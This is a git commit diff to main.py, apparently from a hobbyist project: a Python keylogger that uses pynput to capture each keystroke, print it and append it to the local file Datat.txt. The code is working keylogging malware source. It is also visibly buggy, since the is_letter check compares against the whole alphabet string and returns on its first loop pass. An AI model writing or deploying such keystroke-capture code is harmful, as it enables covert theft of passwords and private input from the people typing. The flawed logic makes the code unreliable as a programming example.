1f2cef3671ef108b537cb1bd8b372f4ed08b6396
Dracomali <firstgcoders@gmail.com>
2020-09-16 20:20:12 -0400

    new file:   .idea/vcs.xml 	modified:   Datat.txt 	modified:   main.py

--- main.py
+++ main.py
@@ -3,32 +3,40 @@ import sys
 from pynput import keyboard
 from pynput.keyboard import Listener
 
-# universal variables for alphabet letters
-alphabet = 'abcdefghijklmnopqrstuvwxyz'
-
 # define 'write' for when key is released
 def write(key):
 
     # define value that stores strokes
     keydata = str(key)
 
-    while True:
-        # With file open with reading and writing permissions write and close the 'keydata' as sting characters
-        with open('Datat.txt', 'r+') as file:
-            # if keydata does not me earlier criteria then keydata is written.
-            file.write(keydata)
+    # With file open with reading and writing permissions write and close the 'keydata' as sting characters
+    with open('Datat.txt', 'r+') as file:
+        # if keydata does not me earlier criteria then keydata is written.
+        file.write(keydata)
+        file.close()
 
-    file.close()
 
-# function when key is pressed
-def on_press(key):
-    # goes through lists that contain the alphabet and looks for
+# defines letters
+def is_letter(value):
+    # universal variables for alphabet letters
+    alphabet = 'abcdefghijklmnopqrstuvwxyz'
+
+    # iterates through alphabet to compare 'value' and returns either True or False
     for letter in alphabet:
-            if key == letter.isupper():
-                print("{0}".format(key.char))
+        if value == alphabet:
+            return True
 
-            else:
-                print ("{0}".format(key))
+        else:
+            return False
+
+
+# function when key is pressed uses the "is_letter" function to compare characters
+def on_press(key):
+    if is_letter(key) == True:
+        print("{0}".format(key.char))
+
+    if is_letter(key) == False:
+            print("{0}".format(key))
 
 
 # Using Listener, everytime on_press is activated function write activates
